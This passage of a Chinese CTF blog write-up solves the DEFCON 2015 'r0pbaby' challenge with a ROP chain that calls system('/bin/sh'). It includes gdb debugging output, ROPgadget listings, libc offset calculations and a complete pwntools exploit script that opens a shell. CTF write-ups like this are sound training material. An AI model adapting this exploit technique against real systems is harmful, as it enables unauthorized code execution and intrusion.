address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 4</span><br><span class="line">Exiting.</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure></p>
+<p>所以，我们的目的很清楚，无非就是覆盖ret addr到我们的shellcode。但目前面临一个问题：在哪里构造shellcode？我们可控的这部分栈肯定不行，因为NX enabled。</p>
+<p>所以，这就需要ROP了，libc里实际上存在着system函数以及”/bin/sh”字符串，如果我们能够拿到system的地址以及”/bin/sh”字符串的地址，就可以为所欲为。通过覆盖ROP <code>pop rdi,ret;</code>的地址到ret addr将”/bin/sh”的地址放入rdi，再依次放置system地址覆盖ret返回的ret addr即可，此时布局如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pad bytes -&gt; skip rbp </span><br><span class="line">ROP addr  -&gt; pop rdi,ret</span><br><span class="line">bin/sh addr -&gt; this will pop to rdi</span><br><span class="line">system addr -&gt; ROP ret addr</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>x64函数调用中，前6个参数依次放入rdi, rsi, rdx, rcx, r8, r9中超过的部分再放入栈中。</p>
+</blockquote>
+<p>尽管ASLR的存在，libc的基址会变化，但是程序本身已经提供了leak info的菜单。不仅可以拿到libc的基址，也可以拿到任意函数的地址。而另一方面，我们可以通过search libc.so.6来找到”/bin/sh”相对libc基址的偏移，或者相对system的偏移，从而算出地址（相对偏移是不会改变的，ASLR只能改变基址）。</p>
+<blockquote>
+<p>ASLR可以通过这些手法来看：</p>
+</blockquote>
+<p><img src="/images/ctf/pwn/20170916_1.jpg" alt=""></p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>我们先通过本地调试，验证一下程序给的地址是否正确：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span> b _IO_getc</span><br><span class="line">Breakpoint 1 at 0x9f0</span><br><span class="line"><span class="meta">gdb-peda$</span> r</span><br><span class="line">warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000</span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: [----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x2 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7ffff7900290 (&lt;__write_nocancel+7&gt;:	cmp    rax,0xfffffffffffff001)</span><br><span class="line">RDX: 0x7ffff7bcf780 --&gt; 0x0 </span><br><span class="line">RSI: 0x3ff </span><br><span class="line">RDI: 0x7ffff7bcd8e0 --&gt; 0xfbad2088 </span><br><span class="line">RBP: 0x0 </span><br><span class="line">RSP: 0x7fffffffd938 --&gt; 0x555555554bc8 (cmp    eax,0xffffffff)</span><br><span class="line">RIP: 0x7ffff787f030 (&lt;getc&gt;:	push   rbx)</span><br><span class="line">R8 : 0x7ffff7fdc700 (0x00007ffff7fdc700)</span><br><span class="line">R9 : 0x2 </span><br><span class="line">R10: 0x814 </span><br><span class="line">R11: 0x7ffff787f030 (&lt;getc&gt;:	push   rbx)</span><br><span class="line">R12: 0x7fffffffd980 --&gt; 0x1 </span><br><span class="line">R13: 0x7ffff7bce710 --&gt; 0x7ffff7bcd8e0 --&gt; 0xfbad2088 </span><br><span class="line">R14: 0x3ff </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff787f020 &lt;fseek+288&gt;:	call   0x7ffff7829b30 &lt;_Unwind_Resume&gt;</span><br><span class="line">   0x7ffff787f025:	nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x7ffff787f02f:	nop</span><br><span class="line">=&gt; 0x7ffff787f030 &lt;getc&gt;:	push   rbx</span><br><span class="line">   0x7ffff787f031 &lt;getc+1&gt;:	mov    eax,DWORD PTR [rdi]</span><br><span class="line">   0x7ffff787f033 &lt;getc+3&gt;:	mov    rbx,rdi</span><br><span class="line">   0x7ffff787f036 &lt;getc+6&gt;:	and    eax,0x8000</span><br><span class="line">   0x7ffff787f03b &lt;getc+11&gt;:	jne    0x7ffff787f093 &lt;getc+99&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffd938 --&gt; 0x555555554bc8 (cmp    eax,0xffffffff)</span><br><span class="line">0008| 0x7fffffffd940 --&gt; 0x7fffffffd980 --&gt; 0x1 </span><br><span class="line">0016| 0x7fffffffd948 --&gt; 0x7fffffffddc0 --&gt; 0x555555554ec0 (push   r15)</span><br><span class="line">0024| 0x7fffffffd950 --&gt; 0x555555554a60 (xor    ebp,ebp)</span><br><span class="line">0032| 0x7fffffffd958 --&gt; 0x7fffffffdea0 --&gt; 0x1 </span><br><span class="line">0040| 0x7fffffffd960 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffd968 --&gt; 0x555555554cdc (test   rax,rax)</span><br><span class="line">0056| 0x7fffffffd970 --&gt; 0x7fffffffda04 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff787f030 in getc ()</span><br><span class="line">   from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"><span class="meta">gdb-peda$</span> p system</span><br><span class="line"><span class="meta">$</span>1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7ffff784e390 &lt;system&gt;</span><br><span class="line"><span class="meta">gdb-peda$</span> info proc mappings</span><br><span class="line">process 6594</span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">          Start Addr           End Addr       Size     Offset objfile</span><br><span class="line">      0x555555554000     0x555555556000     0x2000        0x0 /home/r00tk1t/ctf/write-ups-2015-master/defcon-qualifier-ctf-2015/babys-first/r0pbaby/r0pbaby</span><br><span class="line">      0x555555755000     0x555555757000     0x2000     0x1000 /home/r00tk1t/ctf/write-ups-2015-master/defcon-qualifier-ctf-2015/babys-first/r0pbaby/r0pbaby</span><br><span class="line">      0x555555757000     0x555555778000    0x21000        0x0 [heap]</span><br><span class="line">      0x7ffff7809000     0x7ffff79c9000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">      0x7ffff79c9000     0x7ffff7bc9000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">      0x7ffff7bc9000     0x7ffff7bcd000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">      0x7ffff7bcd000     0x7ffff7bcf000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">      0x7ffff7bcf000     0x7ffff7bd3000     0x4000        0x0 </span><br><span class="line">      0x7ffff7bd3000     0x7ffff7bd6000     0x3000        0x0 /lib/x86_64-linux-gnu/libdl-2.23.so</span><br><span class="line">      0x7ffff7bd6000     0x7ffff7dd5000   0x1ff000     0x3000 /lib/x86_64-linux-gnu/libdl-2.23.so</span><br><span class="line">      0x7ffff7dd5000     0x7ffff7dd6000     0x1000     0x2000 /lib/x86_64-linux-gnu/libdl-2.23.so</span><br><span class="line">      0x7ffff7dd6000     0x7ffff7dd7000     0x1000     0x3000 /lib/x86_64-linux-gnu/libdl-2.23.so</span><br><span class="line">      0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">      0x7ffff7fdb000     0x7ffff7fde000     0x3000        0x0 </span><br><span class="line">      0x7ffff7ff6000     0x7ffff7ff8000     0x2000        0x0 </span><br><span class="line">      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]</span><br><span class="line">      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]</span><br><span class="line">      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 </span><br><span class="line">      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]</span><br><span class="line">  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]</span><br><span class="line"><span class="meta">gdb-peda$</span></span><br></pre></td></tr></table></figure></p>
+<p>程序输出的是<code>libc.so.6: 0x00007FFFF7FF79B0</code>，这和我们看到的不太一致，所以这应该是一个烟雾弹的fake地址（我没有深究程序是如何计算的，但应该就是和IDA里看到的dlopen()有关，至于是何种原因libc地址不正确，就先不关心了）。</p>
+<p>程序输出的system地址是<code>Symbol system: 0x00007FFFF784E390</code>，这个地址是正确的，和print system一致。那么实际上这里也就得出了system到libc的偏移为0x45390。</p>
+<p>再寻找libc.so.6中”/bin/sh”的偏移：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"</span><br><span class="line"> 18cd17 /bin/sh</span><br></pre></td></tr></table></figure></p>
+<p>通过ROPgarget工具搜索gadget：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000000dbeb5 : pop qword ptr [rsi - 0x77000000] ; ret 0xd139</span><br><span class="line">0x0000000000115065 : pop r10 ; ret</span><br><span class="line">0x000000000002024f : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="line">0x00000000000210fb : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000cd6b2 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret</span><br><span class="line">0x00000000000202e3 : pop r12 ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x000000000006d125 : pop r12 ; pop r13 ; pop rbp ; ret</span><br><span class="line">0x00000000000206c2 : pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000000b65d4 : pop r12 ; pop r14 ; ret</span><br><span class="line">0x00000000000398c6 : pop r12 ; pop rbp ; ret</span><br><span class="line">0x000000000001fb12 : pop r12 ; ret</span><br><span class="line">0x0000000000020251 : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="line">0x00000000000210fd : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000cd6b4 : pop r13 ; pop r14 ; pop rbp ; ret</span><br><span class="line">0x00000000000202e5 : pop r13 ; pop r14 ; ret</span><br><span class="line">0x000000000006d127 : pop r13 ; pop rbp ; ret</span><br><span class="line">0x00000000000206c4 : pop r13 ; ret</span><br><span class="line">0x0000000000020253 : pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="line">0x00000000000210ff : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000cd6b6 : pop r14 ; pop rbp ; ret</span><br><span class="line">0x00000000000202e7 : pop r14 ; ret</span><br><span class="line">0x0000000000020255 : pop r15 ; pop rbp ; ret</span><br><span class="line">0x0000000000021101 : pop r15 ; ret</span><br><span class="line">0x000000000001f92e : pop rax ; pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000143571 : pop rax ; pop rdx ; pop rbx ; ret</span><br><span class="line">0x0000000000033544 : pop rax ; ret</span><br><span class="line">0x00000000000caabc : pop rax ; ret 0x2f</span><br><span class="line">0x00000000000210fa : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000202e2 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x00000000000206c1 : pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000000b65d3 : pop rbp ; pop r12 ; pop r14 ; ret</span><br><span class="line">0x000000000001fb11 : pop rbp ; pop r12 ; ret</span><br><span class="line">0x000000000012cac6 : pop rbp ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x0000000000020252 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="line">0x00000000000210fe : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000cd6b5 : pop rbp ; pop r14 ; pop rbp ; ret</span><br><span class="line">0x00000000000202e6 : pop rbp ; pop r14 ; ret</span><br><span class="line">0x000000000006d128 : pop rbp ; pop rbp ; ret</span><br><span class="line">0x0000000000048438 : pop rbp ; pop rbx ; ret</span><br><span class="line">0x000000000001f930 : pop rbp ; ret</span><br><span class="line">0x00000000000cd6b1 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret</span><br><span class="line">0x000000000006d124 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span><br><span class="line">0x00000000000398c5 : pop rbx ; pop r12 ; pop rbp ; ret</span><br><span class="line">0x00000000000202e1 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x00000000000206c0 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000000b65d2 : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret</span><br><span class="line">0x000000000001fb10 : pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">0x000000000012cac5 : pop rbx ; pop rbp ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x000000000001f92f : pop rbx ; pop rbp ; ret</span><br><span class="line">0x000000000002a69a : pop rbx ; ret</span><br><span class="line">0x0000000000001b18 : pop rbx ; ret 0x2a63</span><br><span class="line">0x0000000000185de0 : pop rbx ; ret 0x6f9</span><br><span class="line">0x000000000013cbcf : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x0000000000101efb : pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">0x00000000000ea66a : pop rcx ; pop rbx ; ret</span><br><span class="line">0x0000000000001b17 : pop rcx ; pop rbx ; ret 0x2a63</span><br><span class="line">0x00000000000d20a3 : pop rcx ; ret</span><br><span class="line">0x0000000000020256 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x0000000000021102 : pop rdi ; ret</span><br><span class="line">0x0000000000067499 : pop rdi ; ret 0xffff</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
+<p>0x21102较为理想。实际上ROP构造随意折腾，只要达成目的即可。</p>
+<p>所以，我们目前拿到的信息汇总：</p>
+<ol>
+<li>通过菜单2拿到system地址</li>
+<li>system-0x45390为libc基址</li>
+<li>libc+0x21102为garget <code>pop rdi,ret</code>地址</li>
+<li>libc+0x18cd17为”/bin/sh”地址</li>
+</ol>
+<h2 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">	io = process(<span class="string">"./r0pbaby"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = remote(<span class="string">"127.0.0.1"</span>,<span class="number">10002</span>)</span><br><span class="line">io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">io.send(<span class="string">"2\n"</span>)</span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.send(<span class="string">"system\n"</span>)</span><br><span class="line">msg = io.recv(<span class="number">1024</span>)</span><br><span class="line">offset = msg.find(<span class="string">":"</span>)</span><br><span class="line">offset2 = msg.find(<span class="string">"\n"</span>)</span><br><span class="line">base = msg[offset+<span class="number">2</span>:offset2]</span><br><span class="line">system = long(base,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line"><span class="comment">#system = 0x00007FFFF784E390</span></span><br><span class="line">rdi_gadget_offset = <span class="number">0x21102</span></span><br><span class="line">bin_sh_offset = <span class="number">0x18cd17</span></span><br><span class="line">system_offset = <span class="number">0x45390</span></span><br><span class="line">libc_base = system - system_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] libc base: [%x]"</span> % libc_base</span><br><span class="line">rdi_gadget_addr = libc_base + rdi_gadget_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] RDI gadget addr: [%x]"</span> % rdi_gadget_addr</span><br><span class="line">bin_sh_addr = libc_base + bin_sh_offset</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] \"/bin/sh\" addr[%x]"</span> % bin_sh_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] system addr:[%x]"</span> % system</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">8</span></span><br><span class="line">payload += p64(rdi_gadget_addr)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.send(<span class="string">"%d\n"</span>%(len(payload)+<span class="number">1</span>))</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">"4"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>代码写得略丑，没有规范编码，但较容易理解。</p>
+<p><img src="/images/ctf/pwn/20170916_2.jpg" alt=""></p>
+
+      
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/09/16/DEFCON-2015-r0pbaby/">DEFCON-2015-r0pbaby</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 r00tk1t 的个人博客">r00tk1t</a></p>
+        <p><span>发布时间:</span>2017年09月16日 - 15时03分</p>
+        <p><span>最后更新:</span>2020年10月20日 - 21时01分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/09/16/DEFCON-2015-r0pbaby/" title="DEFCON-2015-r0pbaby">https://r00tk1ts.github.io/2017/09/16/DEFCON-2015-r0pbaby/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://r00tk1ts.github.io/2017/09/16/DEFCON-2015-r0pbaby/　　作者: r00tk1t" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2017/09/23/Windows栈溢出概述/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Windows栈溢出概述
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/09/11/PWN选手的自我修养/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PWN选手的自我修养</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DEFCONF-2015-r0pbaby"><span class="toc-number">1.</span> <span class="toc-text">DEFCONF-2015-r0pbaby</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#踩点"><span class="toc-number">1.1.</span> <span class="toc-text">踩点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#屠龙宝刀IDA"><span class="toc-number">1.2.</span> <span class="toc-text">屠龙宝刀IDA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态调试"><span class="toc-number">1.3.</span> <span class="toc-text">动态调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写exp"><span class="toc-number">1.4.</span> <span class="toc-text">编写exp</span></a></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/09/23/Windows栈溢出概述/" title="上一篇: Windows栈溢出概述">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2017/09/11/PWN选手的自我修养/" title="下一篇: PWN选手的自我修养">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/10/22/chromium-base库源码解读之引用计数拆解篇/">chromium-base库源码解读之引用计数拆解篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/16/深入探索禁忌目录之Effective C++篇/">深入探索禁忌目录之Effective C++篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/10/C++ Primer - 特殊工具与技术/">C++ Primer - 特殊工具与技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/08/C++ Primer - 用于大型程序的工具/">C++ Primer - 用于大型程序的工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/06/C++ Primer - 标准库特殊设施/">C++ Primer - 标准库特殊设施</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/03/C++ Primer - 模板与泛型编程/">C++ Primer - 模板与泛型编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/01/C++ Primer - 面向对象程序设计/">C++ Primer - 面向对象程序设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/29/C++ Primer - 重载运算与类型转换/">C++ Primer - 重载运算与类型转换</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/29/C++ Primer - 拷贝控制/">C++ Primer - 拷贝控制</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/26/C++ Primer - 动态内存/">C++ Primer - 动态内存</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/26/C++ Primer - 关联容器/">C++ Primer - 关联容器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/24/C++ Primer - 泛型算法/">C++ Primer - 泛型算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/24/C++ Primer - 顺序容器/">C++ Primer - 顺序容器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/21/C++ Primer - IO库/">C++ Primer - IO库</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/21/C++ Primer - 类/">C++ Primer - 类</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/20/C++ Primer - 函数/">C++ Primer - 函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/20/C++ Primer - 语句/">C++ Primer -语句</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/20/C++ Primer - 表达/">C++ Primer - 表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/28/C++ Primer - string, vector & array/">C++ Primer - string, vector, array</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/28/C++ Primer - 变量和基本类型/">C++ Primer - 变量和基本类型</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/25/C++ Templates Note - 类模板/">C++ Templates Note - 类模板</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/25/C++ Templates Note - 函数模板/">C++ Templates Note- 函数模板</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/13/Linux内存管理-进程地址空间/">Linux内核学习——内存管理之进程地址空间</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/07/一次失败的栈溢出(SEH)之GetGo Download Manager/">一次失败的栈溢出(SEH)之GetGo Download Manager</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/28/DNSTracer 1.9栈溢出漏洞[CVE-2017-9430]/">DNSTracer 1.9栈溢出漏洞[CVE-2017-9430]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/24/A Tale of Exploit Easy RM 2 MP3 Converter/">A Tale of Exploit "Easy RM 2 MP3</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/chromium-sandbox-ThreadProcess-analysis/">Chromium-sandbox-ThreadProcess-analysis</a></li><li 